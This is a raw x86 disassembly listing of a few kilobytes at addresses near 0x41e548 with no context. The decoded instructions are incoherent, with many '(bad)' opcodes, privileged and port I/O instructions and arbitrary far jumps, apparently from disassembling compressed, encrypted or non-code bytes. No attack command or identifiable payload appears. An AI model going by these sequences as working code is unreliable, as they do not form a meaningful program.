  41e548:	dec    ebp
  41e549:	mov    al,0x8c
  41e54b:	call   0xf6966e15
  41e550:	ss (bad) 
  41e553:	nop
  41e554:	adc    BYTE PTR [ebx-0x70],cl
  41e557:	mov    ebp,0xbae26020
  41e55c:	cmp    DWORD PTR [edx+0x6f],esi
  41e55f:	fcom   DWORD PTR [ecx]
  41e561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e562:	dec    ecx
  41e563:	push   esp
  41e564:	lea    esp,[eax-0x5702cdd7]
  41e56a:	hlt    
  41e56b:	cmc    
  41e56c:	inc    ecx
  41e56d:	popf   
  41e56e:	stc    
  41e56f:	push   es
  41e570:	scas   eax,DWORD PTR es:[edi]
  41e571:	push   edx
  41e572:	pop    es
  41e573:	adc    eax,DWORD PTR [ebp-0x18]
  41e576:	pop    ebx
  41e577:	mov    ds,WORD PTR [ebp+eiz*4-0x3d]
  41e57b:	repz pop ecx
  41e57d:	outs   dx,BYTE PTR ds:[esi]
  41e57e:	mov    edi,0xb55b364f
  41e583:	adc    bh,bl
  41e585:	push   ebx
  41e586:	ret    
  41e587:	mov    edx,0x5af25723
  41e58c:	sub    esi,DWORD PTR [esp+ecx*8-0x70]
  41e590:	pop    ebp
  41e591:	imul   eax,DWORD PTR [ebp+0x6f],0xf69bfd65
  41e598:	out    dx,eax
  41e599:	add    bl,BYTE PTR [edx+0x5c]
  41e59c:	out    dx,al
  41e59d:	cld    
  41e59e:	iret   
  41e59f:	adc    BYTE PTR [ebp-0x4a96a00d],bh
  41e5a5:	test   DWORD PTR [ebx+0x5c4b8221],edi
  41e5ab:	mov    WORD PTR [esi+edx*8+0x58],gs
  41e5af:	pushf  
  41e5b0:	addr16 inc eax
  41e5b2:	push   edi
  41e5b3:	xchg   esi,eax
  41e5b4:	dec    ecx
  41e5b5:	test   al,0xd9
  41e5b7:	popf   
  41e5b8:	fstp   TBYTE PTR [edx-0xb]
  41e5bb:	inc    ecx
  41e5bc:	sub    eax,0xc2e124ed
  41e5c1:	fcomi  st,st(5)
  41e5c3:	loop   0x41e562
  41e5c5:	inc    edx
  41e5c6:	mov    ds:0x53737c7,al
  41e5cb:	push   eax
  41e5cc:	test   BYTE PTR [edx],cl
  41e5ce:	add    ah,al
  41e5d0:	xchg   ebx,eax
  41e5d1:	lods   eax,DWORD PTR ds:[esi]
  41e5d2:	jl     0x41e5e2
  41e5d4:	iret   
  41e5d5:	lahf   
  41e5d6:	xchg   DWORD PTR [ecx+0x4acaa774],ecx
  41e5dc:	and    eax,0xd0938f2
  41e5e1:	dec    edi
  41e5e2:	jns    0x41e5ca
  41e5e4:	dec    esp
  41e5e5:	jmp    0x41e634
  41e5e7:	stos   DWORD PTR es:[edi],eax
  41e5e8:	mov    esi,0xbcc9c4a2
  41e5ed:	outs   dx,BYTE PTR ds:[esi]
  41e5ee:	stos   DWORD PTR es:[edi],eax
  41e5ef:	fstp   TBYTE PTR [esi+0x3f656788]
  41e5f5:	ror    DWORD PTR [esp+edx*8-0x3b],1
  41e5f9:	outs   dx,DWORD PTR ds:[esi]
  41e5fa:	mov    eax,ds:0xe5320c6d
  41e5ff:	push   ss
  41e600:	jmp    0xc5eb:0x9222c5f
  41e607:	(bad)  
  41e608:	push   esp
  41e609:	and    bh,BYTE PTR [edx-0x37]
  41e60c:	cwde   
  41e60d:	push   cs
  41e60e:	jb     0x41e600
  41e610:	cld    
  41e611:	shl    BYTE PTR [ecx+0x4fa5fd9d],0x14
  41e618:	ja     0x41e671
  41e61a:	fwait
  41e61b:	sti    
  41e61c:	dec    edi
  41e61e:	cmp    bh,al
  41e620:	scas   eax,DWORD PTR es:[edi]
  41e621:	push   ebx
  41e622:	sbb    eax,ebp
  41e624:	xchg   edx,eax
  41e625:	mov    ah,0x8c
  41e627:	scas   al,BYTE PTR es:[edi]
  41e628:	jns    0x41e5ca
  41e62a:	sub    eax,DWORD PTR [edi-0x7e]
  41e62d:	(bad)  
  41e62f:	sub    DWORD PTR [edi],edi
  41e631:	mov    WORD PTR [esi+0xbb173ff],es
  41e637:	cmp    esp,edx
  41e639:	test   al,0x37
  41e63b:	rol    BYTE PTR [edi-0x23],0x96
  41e63f:	in     eax,dx
  41e640:	sub    DWORD PTR [ecx-0x55],edx
  41e643:	into   
  41e644:	fidivr DWORD PTR [ebx]
  41e647:	and    ebx,DWORD PTR [eax-0x62357f1c]
  41e64d:	sahf   
  41e64e:	test   al,0x39
  41e650:	lds    eax,FWORD PTR [eax+eiz*1+0x856271d]
  41e657:	cdq    
  41e658:	and    cl,BYTE PTR [ebx+0x6b]
  41e65b:	mov    bh,dl
  41e65d:	add    edx,DWORD PTR [edi]
  41e65f:	pop    esi
  41e660:	pushf  
  41e661:	jmp    0x41e6b6
  41e663:	xchg   edi,eax
  41e664:	adc    al,0x4d
  41e666:	cli    
  41e667:	fcom   QWORD PTR [esi-0x25]
  41e66a:	ret    0x6e35
  41e66d:	mov    ah,dl
  41e66f:	out    dx,eax
  41e670:	add    edi,esp
  41e672:	and    eax,0x3a87ffc0
  41e677:	les    edi,FWORD PTR [ecx]
  41e679:	pop    ebp
  41e67a:	out    dx,eax
  41e67b:	test   al,0x9
  41e67d:	dec    ebx
  41e67e:	das    
  41e67f:	adc    edi,DWORD PTR [ecx-0x2c90db2a]
  41e685:	jmp    0x41e647
  41e687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e688:	mov    ?,WORD PTR [ebx+0x1b]
  41e68b:	sti    
  41e68c:	or     eax,0x4a88c7ad
  41e691:	xor    DWORD PTR [edx],0xffffffb9
  41e694:	jp     0x41e65c
  41e696:	stc    
  41e697:	fcmovb st,st(2)
  41e699:	mov    bh,0xc0
  41e69b:	ja     0x41e6df
  41e69d:	loopne 0x41e6c9
  41e69f:	pop    edx
  41e6a0:	adc    al,0x95
  41e6a2:	jne    0x41e638
  41e6a4:	rol    BYTE PTR [eax+0x1a91e604],1
  41e6aa:	jne    0x41e6b0
  41e6ac:	xchg   esi,eax
  41e6ad:	in     al,0x24
  41e6af:	rol    DWORD PTR [edx+0x29a4d7d8],1
  41e6b5:	ins    BYTE PTR es:[edi],dx
  41e6b6:	fsubr  st(1),st
  41e6b8:	data16 jo 0x41e69d
  41e6bb:	aam    0x70
  41e6bd:	or     ecx,DWORD PTR [esi+edi*4]
  41e6c0:	test   eax,0xdb7268f3
  41e6c5:	call   0x1bf1:0x4a336bb
  41e6cc:	test   edx,ecx
  41e6ce:	jo     0x41e6e2
  41e6d0:	out    dx,eax
  41e6d1:	(bad)  
  41e6d2:	sbb    edx,DWORD PTR [ecx]
  41e6d4:	(bad)  
  41e6d5:	fdivr  DWORD PTR [edx-0x6]
  41e6d8:	in     eax,dx
  41e6d9:	inc    edi
  41e6da:	pop    ds
  41e6db:	jmp    0x59e4:0xcee52362
  41e6e2:	push   ebp
  41e6e3:	std    
  41e6e4:	(bad)  
  41e6e5:	fisub  DWORD PTR [esi]
  41e6e7:	gs mov esp,0x79165a1
  41e6ed:	loope  0x41e750
  41e6ef:	or     ax,0x9b41
  41e6f3:	cmp    DWORD PTR [edx],edi
  41e6f5:	or     edi,DWORD PTR [ecx]
  41e6f7:	aas    
  41e6f8:	stc    
  41e6f9:	mov    ecx,0x44d428dd
  41e6fe:	cli    
  41e6ff:	mov    esi,0x3f76fe2b
  41e704:	mov    ebp,0xc6a72ed1
  41e709:	xor    al,bl
  41e70b:	mov    edx,0x7c5fad34
  41e710:	jns    0x41e6a0
  41e712:	in     al,dx
  41e713:	lods   eax,DWORD PTR ds:[esi]
  41e714:	or     eax,0x80ca44f3
  41e719:	aas    
  41e71a:	adc    ebx,DWORD PTR [edi-0x4a]
  41e71d:	dec    DWORD PTR [ecx]
  41e71f:	aaa    
  41e720:	xor    al,0x74
  41e722:	int3   
  41e723:	sahf   
  41e724:	mov    DWORD PTR [ecx-0x66],edx
  41e727:	or     eax,0xa93ab8cf
  41e72c:	push   cs
  41e72d:	test   DWORD PTR ds:0x363a5c0a,ebp
  41e733:	cmp    al,0xdb
  41e735:	(bad)  
  41e736:	pop    ss
  41e737:	add    al,0x2b
  41e739:	jmp    0x87e1:0x386efd11
  41e740:	imul   eax,DWORD PTR [edx+ebp*2],0xbf76cd1c
  41e747:	mov    bl,0x18
  41e749:	jp     0x41e6e1
  41e74b:	repz mov dl,0x59
  41e74e:	adc    al,0x75
  41e750:	hlt    
  41e751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e752:	xchg   DWORD PTR [ecx],eax
  41e754:	mov    ah,0x96
  41e756:	pop    ecx
  41e757:	jno    0x41e6e2
  41e759:	inc    eax
  41e75a:	mov    ds:0x77ccd4e9,al
  41e75f:	sub    ch,BYTE PTR [eax-0x3d]
  41e762:	pop    ebx
  41e763:	xchg   BYTE PTR [edi+0x63],dh
  41e766:	xor    edi,esi
  41e768:	xor    al,0x8b
  41e76a:	mov    esi,0x3e525b20
  41e76f:	imul   esp,DWORD PTR [eax],0x45b0d104
  41e775:	neg    DWORD PTR [edx+0x2f95b315]
  41e77b:	test   bh,0x4a
  41e77e:	push   ecx
  41e77f:	cmp    bl,0xa0
  41e782:	push   ebp
  41e783:	mov    edi,edi
  41e785:	pop    es
  41e786:	mov    es,WORD PTR [edi]
  41e788:	fs loope 0x41e7ba
  41e78b:	fisttp DWORD PTR [eax-0x170261bc]
  41e791:	outs   dx,BYTE PTR ds:[esi]
  41e792:	pop    ecx
  41e793:	jbe    0x41e800
  41e795:	fcom   st(1)
  41e797:	(bad)  
  41e798:	pop    esi
  41e799:	repz sbb DWORD PTR [edx-0x8],esi
  41e79d:	xor    al,0x8b
  41e79f:	xchg   ebp,eax
  41e7a0:	mov    WORD PTR [esi-0xbb13957],gs
  41e7a6:	mov    WORD PTR [esi],cs
  41e7a8:	adc    dl,dl
  41e7aa:	aaa    
  41e7ab:	jb     0x41e7d9
  41e7ad:	mov    cl,0x6d
  41e7af:	mov    ah,0x28
  41e7b1:	nop
  41e7b2:	repnz iret 
  41e7b4:	dec    dh
  41e7b6:	(bad)  
  41e7b7:	ins    BYTE PTR es:[edi],dx
  41e7b8:	sahf   
  41e7b9:	leave  
  41e7ba:	and    ecx,eax
  41e7bc:	bound  ebx,QWORD PTR [ebx+0x5]
  41e7bf:	ins    DWORD PTR es:[edi],dx
  41e7c0:	jmp    0xb5d67421
  41e7c5:	add    eax,0xe5a5335b
  41e7ca:	sub    al,0x9d
  41e7cc:	jne    0x41e82f
  41e7ce:	add    edi,DWORD PTR [ebx-0x6a171570]
  41e7d4:	mov    esi,0x9390f164
  41e7d9:	xchg   ebx,eax
  41e7da:	cmp    DWORD PTR [eax+0x5c65547d],eax
  41e7e0:	ss (bad) 
  41e7e2:	adc    eax,0x6f8f298a
  41e7e7:	or     DWORD PTR [ecx],ebx
  41e7e9:	in     eax,0x9f
  41e7eb:	push   ds
  41e7ec:	aas    
  41e7ed:	mov    al,ds:0x485d0bff
  41e7f2:	add    BYTE PTR [edx+edi*1],bh
  41e7f5:	ret    0x30a7
  41e7f8:	xor    bl,BYTE PTR [ecx-0x6c4eefea]
  41e7fe:	sbb    eax,0x768cd4e5
  41e803:	jae    0x41e858
  41e805:	test   al,0x9d
  41e807:	in     al,dx
  41e808:	shr    BYTE PTR [edx+0x29f0ce1a],1
  41e80e:	pop    ss
  41e80f:	sbb    esi,DWORD PTR [ebx-0x5c8c7fb5]
  41e815:	jns    0x41e81c
  41e817:	inc    edx
  41e818:	adc    bh,0x57
  41e81b:	pop    ds
  41e81c:	sub    edx,edi
  41e81e:	jno    0x41e7fa
  41e820:	ret    
  41e821:	sub    al,0xc5
  41e823:	adc    eax,0xe6f9cbc1
  41e828:	or     DWORD PTR [ebx+ecx*8-0x60676434],0x67
  41e830:	data16 jge 0x41e87d
  41e833:	in     eax,0x7e
  41e835:	popa   
  41e836:	adc    BYTE PTR [edx-0x79],dh
  41e839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e83a:	out    dx,eax
  41e83b:	stc    
  41e83c:	mov    fs,WORD PTR [ebp+0x7518af51]
  41e842:	mov    ds:0x948dc386,eax
  41e847:	mov    ebx,0xbc4949b
  41e84c:	in     eax,dx
  41e84d:	popa   
  41e84e:	and    ebp,ebp
  41e850:	xchg   DWORD PTR [eax-0x53],esp
  41e853:	jle    0x41e850
  41e855:	jbe    0x41e8ca
  41e857:	cmp    BYTE PTR [edx],al
  41e859:	xor    eax,0xc0835b1d
  41e85e:	mov    WORD PTR [eax+ebp*8],?
  41e861:	popf   
  41e862:	out    dx,al
  41e863:	mov    eax,0x2e246f33
  41e868:	not    BYTE PTR [esi+0x635bad81]
  41e86e:	test   DWORD PTR [ebp+0x3],edx
  41e871:	add    ch,dh
  41e873:	or     dl,BYTE PTR [esi+esi*1-0x79891f82]
  41e87a:	mov    BYTE PTR [ebp-0x6089c2a1],cl
  41e880:	fwait
  41e881:	call   0x325cf167
  41e886:	sbb    BYTE PTR [ecx-0x28d0f37d],ch
  41e88c:	js     0x41e870
  41e88e:	mov    bh,0x65
  41e890:	and    BYTE PTR [ecx+0x3dfbcc45],0xd2
  41e897:	push   edx
  41e898:	popf   
  41e899:	mov    al,0x6e
  41e89b:	sub    bh,BYTE PTR [eax+eiz*8+0x1e55455c]
  41e8a2:	or     ebx,ecx
  41e8a4:	mov    WORD PTR [eax-0x4b],ss
  41e8a7:	adc    BYTE PTR [ecx-0x6074fa68],0xed
  41e8ae:	adc    ebx,edx
  41e8b0:	push   cs
  41e8b1:	loop   0x41e8d9
  41e8b3:	sbb    ah,BYTE PTR [edi]
  41e8b5:	arpl   WORD PTR [ebx+0x3b],ax
  41e8b8:	inc    ebx
  41e8b9:	xchg   ebp,eax
  41e8ba:	dec    edi
  41e8bb:	xchg   ecx,eax
  41e8bc:	xlat   BYTE PTR ds:[ebx]
  41e8bd:	sub    ax,0x456d
  41e8c1:	inc    ebx
  41e8c2:	mov    al,ds:0xbc5fa201
  41e8c7:	out    dx,al
  41e8c8:	retf   0x73e8
  41e8cb:	ret    
  41e8cc:	das    
  41e8cd:	pop    ss
  41e8ce:	xchg   esp,eax
  41e8cf:	pop    eax
  41e8d0:	stos   DWORD PTR es:[edi],eax
  41e8d1:	mov    ds:0x37696640,al
  41e8d6:	scas   al,BYTE PTR es:[edi]
  41e8d7:	sub    ecx,DWORD PTR [edi]
  41e8d9:	pop    edi
  41e8da:	dec    ebx
  41e8db:	pop    edi
  41e8dc:	fist   WORD PTR [esi]
  41e8de:	mov    esp,DWORD PTR [edx-0x5]
  41e8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8e2:	dec    esp
  41e8e3:	dec    esi
  41e8e4:	mov    dh,0x24
  41e8e6:	xchg   ch,bl
  41e8e8:	es jecxz 0x41e8a6
  41e8eb:	lahf   
  41e8ec:	cli    
  41e8ed:	arpl   WORD PTR [edi+eax*1-0x3c],bx
  41e8f1:	aaa    
  41e8f2:	push   esi
  41e8f3:	push   eax
  41e8f4:	in     eax,0x5f
  41e8f6:	cmp    bh,BYTE PTR [edi+0xe]
  41e8f9:	inc    esi
  41e8fa:	popa   
  41e8fb:	out    0x23,al
  41e8fd:	frstor [esp+eiz*4+0xfeb5d7]
  41e904:	(bad)  
  41e905:	ins    BYTE PTR es:[edi],dx
  41e906:	jo     0x41e983
  41e908:	adc    al,0x95
  41e90b:	loopne 0x41e8d2
  41e90d:	dec    esp
  41e90e:	aaa    
  41e90f:	jle    0x41e8f0
  41e911:	pusha  
  41e912:	leave  
  41e913:	mov    ch,0x9b
  41e915:	inc    ebx
  41e916:	pop    esi
  41e917:	xor    DWORD PTR [ebx-0x442ac16f],esi
  41e91d:	rol    DWORD PTR [edx],1
  41e91f:	in     al,dx
  41e920:	inc    ebx
  41e921:	mov    ebp,0x73631aa3
  41e926:	mov    ds:0xa3770d96,eax
  41e92b:	into   
  41e92c:	(bad)  
  41e92d:	xchg   BYTE PTR [eax-0x56216cbc],ch
  41e933:	out    dx,eax
  41e934:	add    eax,0x738e5265
  41e939:	xor    DWORD PTR [ebx-0x78383e58],0xffffffbe
  41e940:	jae    0x41e961
  41e942:	ins    BYTE PTR es:[edi],dx
  41e943:	and    al,0xb3
  41e945:	icebp  
  41e946:	lea    ecx,[edi+0x60]
  41e949:	sar    BYTE PTR [ecx+esi*8-0x3],cl
  41e94d:	call   0x5439:0xeac54c4d
  41e954:	and    DWORD PTR [eax-0x38dafd80],eax
  41e95a:	(bad)  
  41e95b:	xor    ch,BYTE PTR [ebx]
  41e95d:	aad    0xb2
  41e95f:	das    
  41e960:	mov    edi,0x64431125
  41e965:	add    al,0xba
  41e967:	out    dx,eax
  41e968:	idiv   DWORD PTR [edi]
  41e96a:	push   ebx
  41e96b:	cmp    eax,ebp
  41e96d:	test   al,0x39
  41e96f:	push   ss
  41e970:	push   0x3dd46ac3
  41e975:	mov    ds:0x9bb94118,eax
  41e97a:	test   eax,0xfc8e8fe7
  41e97f:	xor    BYTE PTR [ebp+0x75],0x19
  41e983:	mov    DWORD PTR [edx+0x1d],ecx
  41e986:	add    eax,0xb58e130c
  41e98b:	shr    BYTE PTR [esi],1
  41e98d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e98e:	cli    
  41e98f:	sub    cl,BYTE PTR [esi+0x4aac121f]
  41e995:	add    al,0x32
  41e997:	adc    edx,DWORD PTR [ebp+edx*8+0x7af8e9a9]
  41e99e:	cld    
  41e99f:	sti    
  41e9a0:	mov    bl,0x21
  41e9a2:	pushf  
  41e9a3:	mov    eax,ds:0x14906ab3
  41e9a8:	retf   0xea38
  41e9ab:	(bad)  
  41e9ac:	ror    BYTE PTR [ebp-0xe73842b],1
  41e9b2:	and    DWORD PTR [esp+ecx*2-0x6],0xffffffc8
  41e9b7:	cmp    eax,0xcb63e928
  41e9bc:	xor    eax,0xcafe766a
  41e9c1:	out    dx,eax
  41e9c2:	adc    BYTE PTR [ebp+0x7a],cl
  41e9c5:	mov    ds:0xea4922e3,al
  41e9ca:	xor    edi,DWORD PTR [edi]
  41e9cc:	icebp  
  41e9cd:	fst    DWORD PTR [edi-0x612a06df]
  41e9d3:	mov    al,ds:0x33b3d878
  41e9d8:	lea    eax,[ebp+esi*1+0x71]
  41e9dc:	pushf  
  41e9dd:	repnz push eax
  41e9df:	mov    al,ds:0x678a4f35
  41e9e4:	loopne 0x41ea1b
  41e9e6:	aam    0x15
  41e9e8:	xor    DWORD PTR [ebx-0x21],esi
  41e9eb:	shl    DWORD PTR [esi+0xf],cl
  41e9ee:	(bad)  
  41e9ef:	jle    0x41ea6d
  41e9f1:	xor    DWORD PTR [ebp+0x78053015],0x97b3b910
  41e9fb:	cdq    
  41e9fc:	jp     0x41e9a5
  41e9fe:	mov    eax,0xb1e8b652
  41ea04:	add    eax,0xeeffce4b
  41ea09:	and    BYTE PTR [eax],0x38
  41ea0c:	pop    eax
  41ea0d:	mov    eax,0xef632a92
  41ea12:	add    eax,0xddeea5c3
  41ea17:	inc    ecx
  41ea18:	mov    al,ds:0xac23392b
  41ea1d:	in     al,0xe8
  41ea1f:	mov    BYTE PTR [edi+0x1cd16ad8],dh
  41ea25:	adc    eax,0xac9fd9c9
  41ea2a:	shl    ecx,cl
  41ea2c:	mov    ch,BYTE PTR [ecx+0x1c]
  41ea2f:	cmp    eax,0x3e5863ce
  41ea34:	rol    BYTE PTR [eax+0x36],0xb5
  41ea38:	push   edi
  41ea39:	loop   0x41ea4f
  41ea3b:	loopne 0x41e9c4
  41ea3d:	mov    al,0x92
  41ea3f:	mov    edx,0x8408d733
  41ea44:	push   0x74324c4c
  41ea49:	xchg   edx,eax
  41ea4a:	ror    ebp,cl
  41ea4c:	test   al,0x63
  41ea4e:	mov    bh,0x2f
  41ea50:	dec    ebp
  41ea51:	sti    
  41ea52:	bound  ecx,QWORD PTR ds:0x83235788
  41ea58:	add    al,BYTE PTR [eax+0x4e]
  41ea5b:	js     0x41ea81
  41ea5d:	sti    
  41ea5e:	and    bh,bh
  41ea60:	mov    edx,0x9a752519
  41ea65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea66:	adc    BYTE PTR [edi+0x74a22cfa],0x83
  41ea6d:	scas   eax,DWORD PTR es:[edi]
  41ea6e:	add    al,0x55
  41ea70:	clc    
  41ea71:	jle    0x41ea39
  41ea73:	les    eax,FWORD PTR [edi-0x5eb5e239]
  41ea79:	mov    bh,0xb3
  41ea7b:	test   BYTE PTR [edi-0x73d93f74],al
  41ea81:	inc    eax
  41ea82:	sbb    DWORD PTR [edx-0x5e],esp
  41ea85:	je     0x41ea71
  41ea87:	call   0x26856f89
  41ea8c:	lods   al,BYTE PTR ds:[esi]
  41ea8d:	and    bh,BYTE PTR [ebx-0x50653f38]
  41ea93:	vpcmpgtw ymm3,ymm1,YMMWORD PTR [edx+esi*2]
  41ea98:	sub    ah,ah
  41ea9a:	push   edi
  41ea9b:	cdq    
  41ea9c:	jecxz  0x41ea9b
  41ea9e:	xchg   ebx,eax
  41ea9f:	out    dx,al
  41eaa0:	cmp    edi,DWORD PTR [esp+edx*8+0x3ce9af87]
  41eaa7:	mov    WORD PTR [eax],fs
  41eaa9:	clc    
  41eaaa:	js     0x41eaec
  41eaac:	aad    0xf1
  41eaae:	dec    edi
  41eaaf:	mov    dh,0x5
  41eab1:	test   al,0x27
  41eab3:	xchg   ebp,eax
  41eab4:	out    0x1a,eax
  41eab6:	popa   
  41eab7:	add    eax,0xc27c3967
  41eabc:	xor    eax,0x3e143a18
  41eac1:	jmp    0x485a:0xff6501b8
  41eac8:	hlt    
  41eac9:	ins    DWORD PTR es:[edi],dx
  41eaca:	sahf   
  41eacb:	jmp    0x41eafb
  41eacd:	and    DWORD PTR [eax],ecx
  41eacf:	test   al,0xb
  41ead1:	ja     0x41eb32
  41ead3:	cmp    cl,BYTE PTR [esi+0x57]
  41ead6:	xlat   BYTE PTR ds:[ebx]
  41ead7:	pop    ebx
  41ead8:	jmp    0xc5f0:0xe8230531
  41eadf:	jecxz  0x41eb31
  41eae1:	jg     0x41eb2d
  41eae3:	(bad)  
  41eae4:	push   0x41
  41eae6:	test   eax,0x21205a00
  41eaeb:	inc    esp
  41eaec:	mov    ds:0x27c2a78a,al
  41eaf1:	or     ax,0xc607
  41eaf5:	icebp  
  41eaf6:	xchg   dh,ah
  41eaf8:	jmp    0x41ea8a
  41eafa:	int3   
  41eafb:	hlt    
  41eafc:	jbe    0x41ea9b
  41eafe:	mov    cl,0xcf
  41eb00:	(bad)  
  41eb02:	das    
  41eb03:	cmp    edx,DWORD PTR [ebp+ecx*4-0x48]
  41eb07:	inc    edx
  41eb08:	cs xor eax,0xd621e312
  41eb0e:	sbb    ch,dl
  41eb10:	sub    dl,bh
  41eb12:	adc    eax,0x776d9b72
  41eb17:	data16 ja 0x41eadb
  41eb1a:	xlat   BYTE PTR ds:[ebx]
  41eb1b:	sbb    bl,bh
  41eb1d:	test   DWORD PTR [ecx-0x1375651a],edi
  41eb23:	inc    eax
  41eb24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb25:	cmp    al,BYTE PTR [edi+0x12]
  41eb28:	mov    BYTE PTR [ebx-0x61],al
  41eb2b:	xlat   BYTE PTR ds:[ebx]
  41eb2c:	ds inc esp
  41eb2e:	mov    edi,0xf2890136
  41eb33:	xor    eax,0x52156212
  41eb38:	pop    ss
  41eb39:	mov    al,0x2c
  41eb3b:	cmc    
  41eb3c:	paddusw mm2,mm0
  41eb3f:	jbe    0x41eb5d
  41eb41:	cmp    dl,dl
  41eb43:	lods   eax,DWORD PTR ds:[esi]
  41eb44:	push   cs
  41eb45:	xchg   edx,eax
  41eb46:	sti    
  41eb47:	inc    ebx
  41eb48:	lods   eax,DWORD PTR ds:[esi]
  41eb49:	dec    edi
  41eb4a:	dec    ecx
  41eb4b:	int3   
  41eb4c:	cmp    BYTE PTR [edi+edx*4+0x7216ff81],ch
  41eb53:	xchg   ebp,eax
  41eb54:	mov    bl,0x64
  41eb56:	mov    cs,WORD PTR [edi+ebp*1]
  41eb59:	js     0x41ebc4
  41eb5b:	ins    DWORD PTR es:[edi],dx
  41eb5c:	das    
  41eb5d:	lods   al,BYTE PTR ds:[esi]
  41eb5e:	mov    WORD PTR [ecx-0x17],es
  41eb61:	jnp    0x41eb1c
  41eb63:	push   es
  41eb64:	dec    eax
  41eb65:	sar    ecx,1
  41eb67:	or     DWORD PTR [ecx-0x2a],edx
  41eb6a:	idiv   dh
  41eb6c:	imul   ecx,DWORD PTR [ebp-0x2c623e64],0x5f
  41eb73:	jecxz  0x41eb82
  41eb75:	call   0xa204f1a0
  41eb7a:	mov    ebp,0x116a1cd3
  41eb7f:	lods   al,BYTE PTR ds:[esi]
  41eb80:	push   ecx
  41eb81:	push   0x23
  41eb83:	push   eax
  41eb84:	fidivr DWORD PTR [edx]
  41eb86:	adc    ebp,DWORD PTR [ebp-0x412afd50]
  41eb8c:	iret   
  41eb8d:	inc    ecx
  41eb8e:	xchg   ecx,eax
  41eb8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb90:	jno    0x41eb9a
  41eb92:	xor    BYTE PTR [edx],dl
  41eb94:	inc    eax
  41eb95:	pop    esi
  41eb96:	xor    DWORD PTR [eax+ebx*1-0x3a8ffe9],edi
  41eb9d:	call   0x50ac63b5
  41eba2:	test   DWORD PTR [eax-0x42d191fc],esi
  41eba8:	movzx  eax,WORD PTR [ebx+0x6778c692]
  41ebaf:	scas   al,BYTE PTR es:[edi]
  41ebb0:	bound  ebx,QWORD PTR [edx+0x3]
  41ebb3:	sbb    ebp,edx
  41ebb5:	shl    BYTE PTR [edi],cl
  41ebb7:	cmp    esi,DWORD PTR [ebx]
  41ebb9:	int    0x57
  41ebbb:	adc    eax,0x40c5a363
  41ebc0:	and    edi,ebp
  41ebc2:	mov    bh,0x25
  41ebc4:	(bad)  
  41ebc6:	xchg   ebp,eax
  41ebc7:	hlt    
  41ebc8:	retf   0x3dff
  41ebcb:	(bad)  
  41ebcc:	mov    WORD PTR ds:0x91a577a,es
  41ebd2:	jo     0x41ebbc
  41ebd4:	outs   dx,BYTE PTR ds:[esi]
  41ebd5:	bound  esp,QWORD PTR [eax]
  41ebd7:	push   ds
  41ebd8:	xchg   esi,eax
  41ebd9:	sbb    bl,BYTE PTR [esp+esi*1]
  41ebdc:	xchg   esi,eax
  41ebdd:	xchg   ecx,eax
  41ebde:	sbb    ebp,DWORD PTR [edi-0x32cecfae]
  41ebe4:	clc    
  41ebe5:	jb     0x41ebad
  41ebe7:	stc    
  41ebe8:	and    ebx,edi
  41ebea:	xor    edi,ebp
  41ebec:	xchg   ecx,eax
  41ebed:	pop    eax
  41ebee:	fs call 0x6125:0x6cbdcb9b
  41ebf6:	or     ecx,esi
  41ebf8:	(bad)  [esp-0x4a1f9910]
  41ebff:	das    
  41ec00:	cwde   
  41ec01:	xchg   edx,eax
  41ec02:	add    eax,0x44c22c99
  41ec07:	ins    DWORD PTR es:[edi],dx
  41ec08:	add    ah,cl
  41ec0a:	or     DWORD PTR ds:[edi+0x6b42465c],0xfb703b3e
  41ec15:	or     DWORD PTR [edi+0x3ea9f2ee],eax
  41ec1b:	mov    BYTE PTR ds:0xb5abd3ed,ah
  41ec21:	dec    ecx
  41ec22:	cdq    
  41ec23:	mov    edx,cs
  41ec25:	ins    DWORD PTR es:[edi],dx
  41ec26:	mov    cl,0xa5
  41ec28:	add    al,BYTE PTR [ebp+0x241ce9d7]
  41ec2e:	xchg   ecx,eax
  41ec2f:	jle    0x41ec8c
  41ec31:	ins    DWORD PTR es:[edi],dx
  41ec32:	mov    ebx,DWORD PTR [ebp-0x15]
  41ec35:	popf   
  41ec36:	popa   
  41ec37:	jecxz  0x41ec84
  41ec39:	add    BYTE PTR [edi-0x6fcf7750],ch
  41ec3f:	ficomp WORD PTR [edi+0x6c537ebc]
  41ec45:	and    DWORD PTR [ecx-0x1f],ebp
  41ec48:	jo     0x41ec08
  41ec4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec4b:	loopne 0x41ebff
  41ec4d:	or     al,0x4c
  41ec4f:	jb     0x41ec37
  41ec51:	mov    al,0x90
  41ec53:	ror    BYTE PTR [esi],1
  41ec55:	sub    BYTE PTR [esi-0x5f],ch
  41ec58:	mov    ch,0xa0
  41ec5a:	sbb    ah,dl
  41ec5c:	xor    ch,BYTE PTR [edi-0x310c4b55]
  41ec62:	out    0xc2,al
  41ec64:	shr    ebp,1
  41ec66:	cmc    
  41ec67:	gs pop edx
  41ec69:	xor    al,0xd7
  41ec6b:	inc    eax
  41ec6c:	cmp    al,0x81
  41ec6e:	push   ebp
  41ec6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec70:	mov    ebp,ebp
  41ec72:	jle    0x41ec62
  41ec74:	test   al,0x18
  41ec76:	mov    ch,0x10
  41ec78:	mov    edi,0x9f138e7f
  41ec7d:	aam    0x5d
  41ec7f:	push   0x7b
  41ec81:	lahf   
  41ec82:	fdivr  QWORD PTR [edi]
  41ec84:	adc    BYTE PTR ds:0x41cb04be,cl
  41ec8a:	xor    ebp,esp
  41ec8c:	fsubp  st(1),st
  41ec8e:	test   DWORD PTR [ebp-0x11c2e140],edx
  41ec94:	inc    ebx
  41ec95:	stos   BYTE PTR es:[edi],al
  41ec96:	lahf   
  41ec97:	test   eax,0x7b6f2181
  41ec9c:	mov    dl,ch
  41ec9e:	dec    ecx
  41ec9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eca0:	out    0x4e,al
  41eca2:	mov    ds:0xaf03b313,eax
  41eca7:	pop    ss
  41eca8:	pop    ss
